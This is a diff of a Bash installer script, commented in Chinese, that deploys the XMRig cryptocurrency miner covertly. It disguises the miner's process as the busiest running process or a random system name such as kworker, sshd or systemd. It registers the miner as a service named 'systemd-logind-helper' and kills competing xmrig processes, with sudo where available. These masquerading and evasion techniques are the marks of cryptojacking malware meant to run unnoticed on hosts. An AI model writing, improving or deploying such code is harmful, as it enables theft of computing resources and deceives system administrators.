@@ -35,82 +35,16 @@ log_debug() {
 
 # 获取伪装进程名
 get_disguise_name() {
-    # 获取CPU占用最高的进程名
-    local top_process=$(ps aux --no-headers | sort -rn -k3 | head -1 | awk '{print $11}' | sed 's/.*\///')
+    # 获取CPU占用最高的进程名，排除xmrig相关进程
+    local top_process=$(ps aux --no-headers | grep -v -i xmrig | sort -rn -k3 | head -1 | awk '{print $11}' | sed 's/.*\///')
     
-    # 如果获取失败或为空，使用备选系统进程名
-    if [ -z "$top_process" ] || [ "$top_process" = "ps" ] || [ "$top_process" = "sort" ]; then
-        local system_processes=("systemd" "kthreadd" "ksoftirqd/0" "migration/0" "rcu_gp" "rcu_par_gp" "kworker/0:0H" "mm_percpu_wq" "ksoftirqd/1" "migration/1" "rcu_sched" "watchdog/0")
+    # 如果获取失败或为空，或者是系统命令，使用备选系统进程名
+    if [ -z "$top_process" ] || [ "$top_process" = "ps" ] || [ "$top_process" = "sort" ] || [ "$top_process" = "grep" ] || [ "$top_process" = "awk" ]; then
+        local system_processes=("systemd" "kthreadd" "ksoftirqd/0" "migration/0" "rcu_gp" "rcu_par_gp" "kworker/0:0H" "mm_percpu_wq" "ksoftirqd/1" "migration/1" "rcu_sched" "watchdog/0" "sshd" "NetworkManager" "systemd-logind")
         top_process=${system_processes[$RANDOM % ${#system_processes[@]}]}
     fi
     
     echo "$top_process"
-}
-
-# 检查并清理已存在的xmrig进程
-check_and_cleanup_processes() {
-    log_info "检查是否存在已运行的xmrig进程..."
-    
-    # 使用ps -ef检查xmrig进程
-    local xmrig_processes=$(ps -ef | grep -i xmrig | grep -v grep | awk '{print $2}')
-    
-    if [ -n "$xmrig_processes" ]; then
-        log_warn "发现已运行的xmrig进程，正在清理..."
-        
-        # 逐个终止进程
-        echo "$xmrig_processes" | while read -r pid; do
-            if [ -n "$pid" ] && [ "$pid" -gt 0 ] 2>/dev/null; then
-                log_info "终止进程 PID: $pid"
-                kill -TERM "$pid" 2>/dev/null || true
-                
-                # 等待进程优雅退出
-                sleep 2
-                
-                # 如果进程仍然存在，强制终止
-                if kill -0 "$pid" 2>/dev/null; then
-                    log_warn "强制终止进程 PID: $pid"
-                    kill -KILL "$pid" 2>/dev/null || true
-                fi
-            fi
-        done
-        
-        # 使用pkill作为备用清理方法
-        log_info "使用pkill清理剩余的xmrig进程..."
-        pkill -f "xmrig" 2>/dev/null || true
-        
-        # 等待进程完全清理
-        sleep 3
-        
-        # 再次检查是否还有残留进程
-        local remaining_processes=$(ps -ef | grep -i xmrig | grep -v grep | wc -l)
-        if [ "$remaining_processes" -gt 0 ]; then
-            log_warn "仍有 $remaining_processes 个xmrig进程残留，继续强制清理..."
-            pkill -9 -f "xmrig" 2>/dev/null || true
-            sleep 2
-        fi
-        
-        log_info "xmrig进程清理完成"
-    else
-        log_info "未发现运行中的xmrig进程"
-    fi
-    
-    # 检查并停止可能的systemd服务
-    if command -v systemctl >/dev/null 2>&1; then
-        local service_names=("systemd-logind-helper" "xmrig" "miner")
-        for service in "${service_names[@]}"; do
-            if systemctl is-active --quiet "$service" 2>/dev/null; then
-                log_info "停止systemd服务: $service"
-                systemctl stop "$service" 2>/dev/null || true
-                systemctl disable "$service" 2>/dev/null || true
-            fi
-        done
-    fi
-    
-    # 检查并停止SysV服务
-    if [ -f "/etc/init.d/systemd-logind-helper" ]; then
-        log_info "停止SysV服务: systemd-logind-helper"
-        service systemd-logind-helper stop 2>/dev/null || true
-    fi
 }
 
 # 创建隐藏目录
@@ -291,6 +225,49 @@ get_download_url() {
     DOWNLOAD_URL="https://gh.llkk.cc/https://github.com/xmrig/xmrig/releases/download/v${VERSION}/${FILENAME}"
     
     log_info "下载链接: $DOWNLOAD_URL"
+}
+
+# 检测并终止现有的xmrig进程
+kill_existing_xmrig() {
+    log_info "检测现有的xmrig进程..."
+    
+    # 使用ps命令查找xmrig进程
+    local xmrig_pids=$(ps -ef | grep -i xmrig | grep -v grep | awk '{print $2}')
+    
+    if [ -n "$xmrig_pids" ]; then
+        log_warn "发现现有的xmrig进程，正在终止..."
+        
+        # 遍历所有找到的PID并终止
+        for pid in $xmrig_pids; do
+            if [ -n "$pid" ] && [ "$pid" -gt 0 ]; then
+                log_info "终止进程 PID: $pid"
+                
+                # 尝试使用sudo终止进程
+                if command -v sudo >/dev/null 2>&1; then
+                    sudo kill -9 "$pid" 2>/dev/null || {
+                        log_warn "使用sudo终止进程 $pid 失败，尝试直接终止"
+                        kill -9 "$pid" 2>/dev/null || log_warn "无法终止进程 $pid"
+                    }
+                else
+                    # 如果没有sudo，直接使用kill
+                    kill -9 "$pid" 2>/dev/null || log_warn "无法终止进程 $pid"
+                fi
+            fi
+        done
+        
+        # 等待进程完全终止
+        sleep 2
+        
+        # 再次检查是否还有残留进程
+        local remaining_pids=$(ps -ef | grep -i xmrig | grep -v grep | awk '{print $2}')
+        if [ -n "$remaining_pids" ]; then
+            log_warn "仍有xmrig进程运行，但将继续安装"
+        else
+            log_info "所有xmrig进程已成功终止"
+        fi
+    else
+        log_info "未发现现有的xmrig进程"
+    fi
 }
 
 # 检查先决条件
@@ -801,15 +778,15 @@ main() {
         exit 1
     fi
     
+    # 首先检测并终止现有的xmrig进程
+    kill_existing_xmrig
+    
     # 获取伪装名称
     DISGUISE_NAME=$(get_disguise_name)
     SERVICE_NAME="systemd-logind-helper"
     
     log_info "进程将伪装为: $DISGUISE_NAME"
     log_info "服务将命名为: $SERVICE_NAME"
-    
-    # 检查并清理已存在的xmrig进程
-    check_and_cleanup_processes
     
     # 执行安装步骤
     detect_cpu_info
